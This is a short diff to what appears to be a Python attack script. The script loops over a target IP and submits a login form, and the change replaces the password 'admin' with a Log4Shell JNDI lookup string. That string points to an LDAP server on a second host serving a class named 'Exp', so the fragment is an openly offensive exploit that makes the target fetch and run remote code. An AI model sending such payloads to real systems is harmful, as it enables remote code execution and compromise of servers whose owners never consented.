@@ -18,7 +18,7 @@ def main():
     ip_list = ["192.168.98.144"]
     for ip in ip_list:
         print(ip)
-        post_form(ip, "admin", "admin")
+        post_form(ip, "admin", "${jndi:ldap://192.168.98.130:1389/Exp}")
         
     
 
